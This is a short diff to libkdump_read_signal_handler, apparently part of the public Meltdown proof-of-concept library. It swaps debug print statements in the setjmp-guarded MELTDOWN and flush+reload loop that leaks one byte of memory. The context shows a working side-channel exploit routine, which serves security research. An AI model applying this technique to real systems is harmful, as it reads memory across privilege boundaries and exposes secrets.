@@ -511,21 +511,18 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() {
 int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
   size_t retries = config.retries + 1;
   uint64_t start = 0, end = 0;
-  uint64_t count = 0;
 
   while (retries--) {
     if (!setjmp(buf)) {
       //jump to meltdown
-      count++;
-      printf("here for the %d time", count);
       MELTDOWN;
     }
 
     int i;
     for (i = 0; i < 256; i++) {
       if (flush_reload(mem + i * 4096)) {
+        printf("Retries is : %d\ni is : %d\n", retries, i);
         if (i >= 1) {
-          printf("flushed out %c\n", i);
           return i;
         }
       }
